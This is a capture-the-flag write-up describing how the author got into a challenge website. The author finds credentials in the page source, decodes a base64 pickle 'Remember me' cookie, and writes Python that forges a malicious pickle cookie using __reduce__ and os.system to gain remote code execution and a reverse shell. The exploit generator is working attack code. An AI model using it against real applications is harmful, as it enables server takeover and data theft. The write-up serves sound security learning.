
Challenge Description:
We have noticed some weird actions on our website , we think that our passwd file has been compromised , can you make sure that it is secure

Step 1:
when you open the chakenge link you will see a login page i try to do a sqli didn't work then 
Step 2:
i open the page sourse i found a username and password  
step 3:
whe i login there is nothing useful i try bunch of thing like dir fuzzing 

step4:
 i notice there is a Remember me button when i cheaked it  there is new cookie apper after same search i found that cookie is a pickle serialization

step 5: 
i try to deserialize i try to decode as base64 but the apper in a unreadable text 
![image](https://github.com/user-attachments/assets/99a6ae69-8641-46b6-ab96-a843d92f77a7)

step 6:
i try use code i found in the internet but the same thing after same deging i found why the apper in unredable text i write this code to deserialize

```
import pickle
import base64

# Define the class `usr` (or import it if it's defined elsewhere)
class usr:
    def __init__(self, username, password):
       pass
    def __repr__(self):
        return f"usr(username='{self.username}', password='{self.password}')"
cookie = "yourcookie"

# Decode the base64 encoded string
decoded_cookie = base64.b64decode(cookie)

# Deserialize using pickle
deserialized_data = pickle.loads(decoded_cookie)

print(deserialized_data)
```
the output of this code be like this ```usr(username='test', password='test')```

step 7:
Then i write code to make my own serializa cookie i write this code 
```
import pickle
import base64
import subprocess
import os

class RCE(object):
    def __reduce__(self):
        cmd = 'Here can put any command you want '
        return os.system, (cmd,)

class usr(object):
    def __init__(self, username, password):
        self.username = username
        self.password = password

if __name__ == '__main__':
    user = usr(username=RCE(), password=RCE())

    pickled = pickle.dumps(user)
    
    encoded = base64.b64encode(pickled)
    print(encoded)
    encoded_urlsafe = base64.urlsafe_b64encode(pickled)
    print(encoded_urlsafe)
```
Then i make a rev shell then after genrate the cookie change it with cookie in the website 
after getting the rev shell i try to search to found the flag but notheing there called flag.txt samething like that after a reread the Description i notice i will found in the /etc/passwd file 
